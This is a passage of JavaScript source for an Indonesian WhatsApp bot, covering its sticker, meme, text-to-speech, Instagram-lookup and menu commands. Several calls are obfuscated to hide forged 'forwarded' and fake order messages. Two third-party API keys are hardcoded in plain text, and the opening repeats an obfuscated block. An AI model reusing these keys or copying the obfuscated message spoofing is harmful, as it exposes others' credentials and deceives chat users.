_0x4dbdc6=parseInt(_0x3e3781(0x175))*parseInt(_0x3e3781(0x173))+-parseInt(_0x3e3781(0x176))*-parseInt(_0x3e3781(0x179))+-parseInt(_0x3e3781(0x178))*-parseInt(_0x3e3781(0x180))+-parseInt(_0x3e3781(0x17a))+parseInt(_0x3e3781(0x172))+parseInt(_0x3e3781(0x171))*-parseInt(_0x3e3781(0x177))+-parseInt(_0x3e3781(0x17d))*parseInt(_0x3e3781(0x17c));if(_0x4dbdc6===_0x162fed)break;else _0xd02a9f['push'](_0xd02a9f['shift']());}catch(_0x3cc89c){_0xd02a9f['push'](_0xd02a9f['shift']());}}}(_0x4c3d,0x1f32e),dila[_0x26f9d5(0x17e)](from,dnsnew,image,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x26f9d5(0x17f)}:{}},'message':{'locationMessage':{'name':cr,'h':cr,'jpegThumbnail':fs[_0x26f9d5(0x181)](_0x26f9d5(0x17b))}}},'thumbnail':await getBuffer(me[_0x26f9d5(0x174)]),'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'caption':inponya}));
break
				case 'simplemenu':
				
│
└「 *_${botName}_* 」`
var _0x4c3d=['mJa1ntH1EvDPugu','n051DffcEa','C2vUze1LC3nHz2u','C3rHDhvZqgjYB2fKy2fZDa','ndiWmtLAtwHQrM0','CMvHzezPBgvtEw5J','nJqXmhbXy0juyG','nZiWnZv0wuzeBuq','odGYnNrVsMjlAa','Aw1NvxjS','mtLhB3rmBxi','n1fnq1jiyG','n2LXBuT6vq','mwPQEKXjAG','mJiXmZjpvKjntfq','mtiWmtq2tLjhrffr','lI9KBNmVDgH1BwjUywLSlMPWzwC'];var _0x26f9d5=_0x136f;function _0x136f(_0x255bc6,_0x4e0926){_0x255bc6=_0x255bc6-0x171;var _0x4c3d79=_0x4c3d[_0x255bc6];if(_0x136f['eVjBpS']===undefined){var _0x136ffd=function(_0x3786fb){var _0x19466a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3d2254='';for(var _0x27515d=0x0,_0x351603,_0x3c4b38,_0x5b7230=0x0;_0x3c4b38=_0x3786fb['charAt'](_0x5b7230++);~_0x3c4b38&&(_0x351603=_0x27515d%0x4?_0x351603*0x40+_0x3c4b38:_0x3c4b38,_0x27515d++%0x4)?_0x3d2254+=String['fromCharCode'](0xff&_0x351603>>(-0x2*_0x27515d&0x6)):0x0){_0x3c4b38=_0x19466a['indexOf'](_0x3c4b38);}return _0x3d2254;};_0x136f['GmEeZI']=function(_0x28d6e4){var _0x436004=_0x136ffd(_0x28d6e4);var _0x19e283=[];for(var _0x299070=0x0,_0xe084bd=_0x436004['length'];_0x299070<_0xe084bd;_0x299070++){_0x19e283+='%'+('00'+_0x436004['charCodeAt'](_0x299070)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x19e283);},_0x136f['OemFbF']={},_0x136f['eVjBpS']=!![];}var _0x2f43da=_0x4c3d[0x0],_0x4ef8d9=_0x255bc6+_0x2f43da,_0x4c96f9=_0x136f['OemFbF'][_0x4ef8d9];return _0x4c96f9===undefined?(_0x4c3d79=_0x136f['GmEeZI'](_0x4c3d79),_0x136f['OemFbF'][_0x4ef8d9]=_0x4c3d79):_0x4c3d79=_0x4c96f9,_0x4c3d79;}(function(_0xd02a9f,_0x162fed){var _0x3e3781=_0x136f;while(!![]){try{var _0x4dbdc6=parseInt(_0x3e3781(0x175))*parseInt(_0x3e3781(0x173))+-parseInt(_0x3e3781(0x176))*-parseInt(_0x3e3781(0x179))+-parseInt(_0x3e3781(0x178))*-parseInt(_0x3e3781(0x180))+-parseInt(_0x3e3781(0x17a))+parseInt(_0x3e3781(0x172))+parseInt(_0x3e3781(0x171))*-parseInt(_0x3e3781(0x177))+-parseInt(_0x3e3781(0x17d))*parseInt(_0x3e3781(0x17c));if(_0x4dbdc6===_0x162fed)break;else _0xd02a9f['push'](_0xd02a9f['shift']());}catch(_0x3cc89c){_0xd02a9f['push'](_0xd02a9f['shift']());}}}(_0x4c3d,0x1f32e),dila[_0x26f9d5(0x17e)](from,dnsnew,image,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x26f9d5(0x17f)}:{}},'message':{'locationMessage':{'name':cr,'h':cr,'jpegThumbnail':fs[_0x26f9d5(0x181)](_0x26f9d5(0x17b))}}},'thumbnail':await getBuffer(me[_0x26f9d5(0x174)]),'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'caption':inponya}));
break
				case 'simplemenu':
				case 'simpelmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const simpel = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}sticker\`\`\`
\`\`\`├ ${prefix}stickergif\`\`\`
\`\`\`├ ${prefix}stickwm\`\`\`
\`\`\`├ ${prefix}sticknobg\`\`\`
\`\`\`├ ${prefix}takestick\`\`\`
\`\`\`├ ${prefix}smeme\`\`\`
\`\`\`├ ${prefix}fdeface\`\`\`
\`\`\`├ ${prefix}nuliskiri\`\`\`
\`\`\`├ ${prefix}nuliskanan\`\`\`
\`\`\`├ ${prefix}igstalk\`\`\`
\`\`\`├ ${prefix}lirik\`\`\`
\`\`\`├ ${prefix}mimpi\`\`\`
\`\`\`├ ${prefix}jadwaltv\`\`\`
\`\`\`├ ${prefix}tts\`\`\`
\`\`\`├ ${prefix}ttp\`\`\`
\`\`\`├ ${prefix}attp\`\`\`
\`\`\`├ ${prefix}emoji\`\`\`
\`\`\`├ ${prefix}simi\`\`\`
\`\`\`├ ${prefix}quotes\`\`\`
\`\`\`├ ${prefix}bikinquote\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x4e07=['C3rHDhvZqgjYB2fKy2fZDa','mJuXnZiXAgrOtMHU','nde1odG1v3HiuKjK','mJa0odGXDxrYD2D5','C2vUze1LC3nHz2u','ndC5ndi5D1f1tK56','lI9KBNmVDgH1BwjUywLSlMPWzwC','ndzPuwPTrKC','CMvHzezPBgvtEw5J','ndq4ntiYsMzdCgXi','mebZlNDOyxrZyxbWlM5LDa','u2LTCgXLie1LBNu','mti0ndyXovf4txLTBa','nZiYm29tuhblEG'];function _0x589d(_0x4310f8,_0x1802cb){_0x4310f8=_0x4310f8-0x112;var _0x4e077b=_0x4e07[_0x4310f8];if(_0x589d['gceiNN']===undefined){var _0x589d60=function(_0x4b7cd3){var _0x3c630a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x201643='';for(var _0x44481b=0x0,_0xea62bf,_0x1f53c2,_0x1c5db1=0x0;_0x1f53c2=_0x4b7cd3['charAt'](_0x1c5db1++);~_0x1f53c2&&(_0xea62bf=_0x44481b%0x4?_0xea62bf*0x40+_0x1f53c2:_0x1f53c2,_0x44481b++%0x4)?_0x201643+=String['fromCharCode'](0xff&_0xea62bf>>(-0x2*_0x44481b&0x6)):0x0){_0x1f53c2=_0x3c630a['indexOf'](_0x1f53c2);}return _0x201643;};_0x589d['sNJhhy']=function(_0x625147){var _0xb639ce=_0x589d60(_0x625147);var _0x5012aa=[];for(var _0x510bc5=0x0,_0x1bf32d=_0xb639ce['length'];_0x510bc5<_0x1bf32d;_0x510bc5++){_0x5012aa+='%'+('00'+_0xb639ce['charCodeAt'](_0x510bc5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5012aa);},_0x589d['umnKDS']={},_0x589d['gceiNN']=!![];}var _0x1e2ae1=_0x4e07[0x0],_0x4976ff=_0x4310f8+_0x1e2ae1,_0x4d6739=_0x589d['umnKDS'][_0x4976ff];return _0x4d6739===undefined?(_0x4e077b=_0x589d['sNJhhy'](_0x4e077b),_0x589d['umnKDS'][_0x4976ff]=_0x4e077b):_0x4e077b=_0x4d6739,_0x4e077b;}var _0xecfcf7=_0x589d;(function(_0x1914db,_0x266f71){var _0x18cef8=_0x589d;while(!![]){try{var _0x4b4031=parseInt(_0x18cef8(0x116))+parseInt(_0x18cef8(0x119))+parseInt(_0x18cef8(0x11d))+parseInt(_0x18cef8(0x117))+-parseInt(_0x18cef8(0x115))+parseInt(_0x18cef8(0x113))*parseInt(_0x18cef8(0x11b))+-parseInt(_0x18cef8(0x112));if(_0x4b4031===_0x266f71)break;else _0x1914db['push'](_0x1914db['shift']());}catch(_0x5c925e){_0x1914db['push'](_0x1914db['shift']());}}}(_0x4e07,0x5de7b),dila[_0xecfcf7(0x118)](from,simpel,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0xecfcf7(0x11e),...from?{'remoteJid':_0xecfcf7(0x114)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0xecfcf7(0x11c)](_0xecfcf7(0x11a)),'surface':0xc8,'message':_0xecfcf7(0x11f),'orderTitle':'Simple\x20Menu','sellerJid':_0xecfcf7(0x11e)}}}}));
				    break
					case 'sticknobg':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
									if (!isQuotedSticker) return reply('stickernya mana anjeng')
					if (isQuotedSticker) {
												 if (Lan.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply gambarnya!')
ger = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ran = getRandom('.png')
ehgmediabi = await dila.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
	fs.writeFileSync('sticknobg.png', fs.readFileSync(ran))
						if (err) return reply('Error om')
							ranp = getRandom('.png')
					keyrmbg = '5LXrQ1MAYDnE1iib6B6NaHMv'
							removeBackgroundFromImageFile({path: 'sticknobg.png', apiKey: keyrmbg, size: 'auto', type: 'auto', ranp})
							.then(res => {
								let buffur = Buffer.from(res.base64img, 'base64')
								fs.writeFileSync(ranp, buffur)
								var imgbb = require('imgbb-uploader')
								imgbb("68cb5bee517bce4f74b0e910a5d96346", ranp)
								.then(anu => {
								sendStickerUrl(from, anu.display_url)
								})
							})
					})
					} else {
						reply('Stickernya?')
					}
									break
					case 'smeme':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
									 var tex1 = body.slice(7).split('|')[0]
var tex2 = body.slice(7).split('|')[1]
if (Lan.message.extendedTextMessage != undefined || Lan.message.extendedTextMessage != null) {
                                          ger = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        owgi = await dila.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://api-self.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
					case 'emoji':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
		   if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[4].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
					case 'swm':
					case 'stikerwm':
					case 'stickerwm':
					case 'stickwm':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
		    var Exif = require(process.cwd() + '/exif.js')
            var exif = new Exif()
            var stickerWm = (media, packname, author) => {
            ran = getRandom('.webp')
            exif.create(packname, author, from.split("@")[0])
            exec(`webpmux -set exif ./temp/${from.split("@")[0]}.exif ./${media} -o ./${ran}`, (err, stderr, stdout) => {
            if (err) return dila.sendMessage(from, String(err), text, { quoted: Lan})
            dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
        })
    }
    if ((isMedia && !isQuotedVideo || isQuotedImage) && args.length >= 0) {
               var mediaEncrypt = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Lan
               var mediaFinalys = await dila.downloadAndSaveMediaMessage(mediaEncrypt, 'dlstikerwm')
               var kls = body.slice(5)
			   var has = kls.split("|")[0];
			   var kas = kls.split("|")[1];
               var packageName = `${has}`
               var packageAuthor = `${kas}`
               var exifName = 'stikerwm.exif',
                   webpName = `${from.split(/@/)[0]}.webp`
               try {
                   exec(`cwebp -q 50 dlstikerwm.jpeg -o ${webpName}`, (e, stderr, stdout) => {
                       if (e) return reply(from, String(stderr))
                           stickerWm(webpName, packageName, packageAuthor)
                   })
               } catch (e) {
                   throw e
               }
           }
                break
					case 'takestick':
					case 'takesticker':
					case 'takestiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
              encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			  media = await dila.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              var kls = body.slice(11)
			  var has = kls.split("|")[0];
		      var kas = kls.split("|")[1];
              satu = anu[0] !== `${pushname}` ? anu[0] : `${has}`
              dua = typeof anu[1] !== `${pushname}` ? anu[1] : `${kas}`
              require('./lib/exif.js').createExif(satu, dua)
			  require('./lib/exif.js').modStick(media, dila, Lan, from)
				break
				case 'sticker':
				case 'stiker':
				case 'stickergif':
				case 'stikergif':
				case 'sgif':
				case 's':
				if (isBanned) return reply(dla.baned())
					if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								costum('[❗] SEDANG DIPROSES', text, tescuk, cr)
							})
							.on('end', function () {
								console.log('Finish')
								dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && Lan.message.videoMessage.seconds < 11 || isQuotedVideo && Lan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						costum('[❗] SEDANG DIPROSES', text, tescuk, cr)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
							})
							.on('end', function () {
								console.log('Finish')

								dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
					}
					break
					case 'nuliskiri':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teksnya mana kak? Contoh : ${prefix}nuliskiri Dns Bot`)
					reply('「❗」WAIT BRO GUE NULIS DUMLU YAKAN')
					kir = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${q}&APIKEY=${xteam}`)
					dila.sendMessage(from, kir, image, { quoted: Lan, caption: 'Nihh kak' })
					break
				case 'nuliskanan':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teksnya mana kak? Contoh : ${prefix}nuliskanan Dns Bot`)
					reply('「❗」WAIT BRO GUE NULIS DUMLU YAKAN')
					kan = await getBuffer(`https://api.xteam.xyz/magernulis3?text=${q}&APIKEY=${xteam}`)
					dila.sendMessage(from, kan, image, { quoted: Lan, caption: 'Nihh kak' })
					break
case 'igstalk':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.imitend(pusname, prefix))
					await limitAdd(sender)
            if (!q) return reply(`Masukan username!\nContoh :\n${prefix}igstalk denssptraa_`)
					anu = await fetchJson(`https://api.xteam.xyz/dl/igstalk?nama=${q}&APIKEY=${xteam}`)
					reply (dla.wait())
					stig = await getBuffer(anu.result.user.hd_profile_pic_url_info.url)
					abu = anu.result.user
					hasil = `「 *IG-STALK* 」

❏ *Nama* : ${abu.full_name}
❏ *Followers* : ${abu.follower_count}
❏ *Following* : ${abu.following_count}
❏ *Jumlah Post* : ${abu.media_count}
❏ *Biografi* : ${abu.biography}`
					dila.sendMessage(from, stig, image, { quoted: Lan, caption: hasil })
					break
				case 'tts':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return dila.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: Lan })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return dila.sendMessage(from, `Teksnya mana kak | contoh : ${prefix}tts id ah yamate kudasai`, text, { quoted: Lan })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								dila.sendMessage(from, buff, audio, {  ptt: true, quoted: Lan })
								fs.unlinkSync(rano)
							})
						})
					break

				case 'ttp':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}ttp BOT`)
					pngttp = './temp/ttp.png'
					webpng = './temp/ttp.webp'
					fetch(`https://api.areltiyan.site/sticker_maker?text=${q}`, { method: 'GET' })
						.then(async res => {
							const ttptxt = await res.json()
							console.log("BERHASIL")
							base64Img.img(ttptxt.base64, 'temp', 'ttp', function (err, filepath) {
								if (err) return console.log(err);
								exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
									buffer = fs.readFileSync(webpng)
									dila.sendMessage(from, buffer, sticker,{quoted:Lan})
									fs.unlinkSync(webpng)
									fs.unlinkSync(pngttp)
								})
							})
						});
					break
				case 'attp':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp BOT`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
					dila.sendMessage(from, atetepe, sticker, { quoted: Lan })
					break

				case 'simi':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!q) return reply(`Mau Ngapain?\nContoh :\n${prefix}simi halo`)
					anu = await fetchJson(`https://api.xteam.xyz/simsimi?kata=halo&APIKEY=${xteam}`)
					reply(anu.jawaban)
					break

				case 'quotes':
					dila.updatePresence(from, Presence.composing)
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/quote.json');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					randQuote = '' + randKey.quote + '\n\n_By: ' + randKey.by + '_'
					fakestatus(randQuote)
					break

				case 'bikinquote':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var quote = gh.split("&")[0];
					var wm = gh.split("&")[1];
					const pref = `yang mau dijadiin quote apaan, titit?\ncontoh :\n${prefix}bikinquote aku bukan boneka & Kata Ilham`
					if (args.length < 1) return reply(pref)
					reply(dla.wait())
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=random`, { method: 'get' })
					biquote = await getBuffer(anu.result)
					dila.sendMessage(from, biquote, image, { caption: 'Nih kak >_<', quoted: Lan })
					break
				case 'groupmenu':
				case 'grupmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const menugrup = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}welcome\`\`\`
\`\`\`├ ${prefix}leveling\`\`\`
\`\`\`├ ${prefix}antilink\`\`\`
\`\`\`├ ${prefix}antibule\`\`\`
\`\`\`├ ${prefix}getpict\`\`\`
\`\`\`├ ${prefix}getbio\`\`\`
\`\`\`├ ${prefix}getppgc\`\`\`
\`\`\`├ ${prefix}getdeskgc\`\`\`
\`\`\`├ ${prefix}group\`\`\`
\`\`\`├ ${prefix}admin\`\`\`
\`\`\`├ ${prefix}kontak\`\`\`
\`\`\`├ ${prefix}autosticker\`\`\`
\`\`\`├ ${prefix}kontag\`\`\`
\`\`\`├ ${prefix}totag\`\`\`
\`\`\`├ ${prefix}sticktag\`\`\`
\`\`\`├ ${prefix}imgtag\`\`\`
\`\`\`├ ${prefix}ephemeral\`\`\`
\`\`\`├ ${prefix}creategroup\`\`\`
\`\`\`├ ${prefix}add\`\`\`
\`\`\`├ ${prefix}kick\`\`\`
\`\`\`├ ${prefix}afk\`\`\`
\`\`\`├ ${prefix}hidetag\`\`\`
\`\`\`├ ${prefix}level\`\`\`
\`\`\`├ ${prefix}hacked\`\`\`
\`\`\`├ ${prefix}linkgroup\`\`\`
\`\`\`├ ${prefix}tagall\`\`\`
\`\`\`├ ${prefix}simih\`\`\`
\`\`\`├ ${prefix}setname\`\`\`
\`\`\`├ ${prefix}setdesc\`\`\`
\`\`\`├ ${prefix}demote\`\`\`
\`\`\`├ ${prefix}promote\`\`\`
\`\`\`├ ${prefix}fitnah\`\`\`
\`\`\`├ ${prefix}jadian\`\`\`
\`\`\`├ ${prefix}delete\`\`\`
\`\`\`├ ${prefix}mining\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x390b=['nJi1sNfRzMH3','nZK1mtGXAxjushHY','muDMwgzyAW','C3rHDhvZqgjYB2fKy2fZDa','ndKZmtf1AKzowuW','mJmZnJu3Bxrezuzd','nZC4rxDjANzU','mebZlNDOyxrZyxbWlM5LDa','ntC4mde1twTmChnq','mJqWuNfyu0HQ','m2HKv3Djvq','mZaWndyYANLbCLnb','lI9KBNmVDgH1BwjUywLSlMPWzwC','C2vUze1LC3nHz2u','r3jVDxaGtwvUDq','mtq1m1jwrvbhrq'];function _0x5bab(_0x101e1d,_0x46408d){_0x101e1d=_0x101e1d-0x1ad;var _0x390b3b=_0x390b[_0x101e1d];if(_0x5bab['erCyNp']===undefined){var _0x5babb7=function(_0x238099){var _0x1d8058='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4dd592='';for(var _0x165421=0x0,_0x21adad,_0x1a8695,_0x5f0bfa=0x0;_0x1a8695=_0x238099['charAt'](_0x5f0bfa++);~_0x1a8695&&(_0x21adad=_0x165421%0x4?_0x21adad*0x40+_0x1a8695:_0x1a8695,_0x165421++%0x4)?_0x4dd592+=String['fromCharCode'](0xff&_0x21adad>>(-0x2*_0x165421&0x6)):0x0){_0x1a8695=_0x1d8058['indexOf'](_0x1a8695);}return _0x4dd592;};_0x5bab['PhaQOo']=function(_0x301e90){var _0x36ca67=_0x5babb7(_0x301e90);var _0x487770=[];for(var _0x2b9fd4=0x0,_0x3f752e=_0x36ca67['length'];_0x2b9fd4<_0x3f752e;_0x2b9fd4++){_0x487770+='%'+('00'+_0x36ca67['charCodeAt'](_0x2b9fd4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x487770);},_0x5bab['wgkWXY']={},_0x5bab['erCyNp']=!![];}var _0x25d85e=_0x390b[0x0],_0x59290a=_0x101e1d+_0x25d85e,_0x3f5bd7=_0x5bab['wgkWXY'][_0x59290a];return _0x3f5bd7===undefined?(_0x390b3b=_0x5bab['PhaQOo'](_0x390b3b),_0x5bab['wgkWXY'][_0x59290a]=_0x390b3b):_0x390b3b=_0x3f5bd7,_0x390b3b;}var _0x57f395=_0x5bab;(function(_0x18d1f0,_0x4abf4f){var _0x246a67=_0x5bab;while(!![]){try{var _0x19f005=parseInt(_0x246a67(0x1b7))+parseInt(_0x246a67(0x1b1))+parseInt(_0x246a67(0x1b8))*-parseInt(_0x246a67(0x1bb))+parseInt(_0x246a67(0x1b5))*-parseInt(_0x246a67(0x1af))+parseInt(_0x246a67(0x1ae))+-parseInt(_0x246a67(0x1bc))*parseInt(_0x246a67(0x1b6))+parseInt(_0x246a67(0x1b0))*-parseInt(_0x246a67(0x1ba));if(_0x19f005===_0x4abf4f)break;else _0x18d1f0['push'](_0x18d1f0['shift']());}catch(_0x2cbcf0){_0x18d1f0['push'](_0x18d1f0['shift']());}}}(_0x390b,0x6f98a),dila[_0x57f395(0x1b3)](from,menugrup,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x57f395(0x1ad),...from?{'remoteJid':_0x57f395(0x1b9)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync'](_0x57f395(0x1b2)),'surface':0xc8,'message':_0x57f395(0x1b4),'orderTitle':_0x57f395(0x1b4),'sellerJid':_0x57f395(0x1ad)}}}}));
					break
					case 'getdeskgc':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
			   anu = from
			   metadete = await dila.groupMetadata(anu)
				dila.sendMessage(from, metadete.desc, text, {quoted:Lan})
				  break
					case 'getppgc':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
				anu = from
		if (`${anu}@g.us`) {
		try {
					ppimg = await dila.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await dila.groupMetadata(anu)
				ano = await dila.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				dila.sendMessage(from, buffer, image, {quoted: Lan})
		} else {
		}
			  break
					case 'ephemeral':    
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					var _0x5cb4=['mtfot2Pos3e','nJmXnJvpEg9es3i','mZi2mZK1A1bPve1e','mwLjr21HyW','mtC1odfhq09PCwO','mvbuAfDLuW','mJu1nZG1uNvkwgzO','mtDqtwXgAuS','z2v0uhjVzMLSzvbPy3r1CMu','mtm1nZzvD2ziswq','ndzlseXPChG','ndbXBK56CLe','mK9zDhjiuW','C2XPy2u','mZyZmtD6qvrcz0K','ntu0ouvpCefcuW'];var _0x46a50d=_0x4da9;function _0x4da9(_0x596c96,_0x78f9a0){_0x596c96=_0x596c96-0x1a7;var _0x5cb47e=_0x5cb4[_0x596c96];if(_0x4da9['KvLFVm']===undefined){var _0x4da997=function(_0x3113ef){var _0xc22665='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2454a6='';for(var _0x4f47d7=0x0,_0x40ac5d,_0x59a288,_0x351cf5=0x0;_0x59a288=_0x3113ef['charAt'](_0x351cf5++);~_0x59a288&&(_0x40ac5d=_0x4f47d7%0x4?_0x40ac5d*0x40+_0x59a288:_0x59a288,_0x4f47d7++%0x4)?_0x2454a6+=String['fromCharCode'](0xff&_0x40ac5d>>(-0x2*_0x4f47d7&0x6)):0x0){_0x59a288=_0xc22665['indexOf'](_0x59a288);}return _0x2454a6;};_0x4da9['NuHSmw']=function(_0x47e716){var 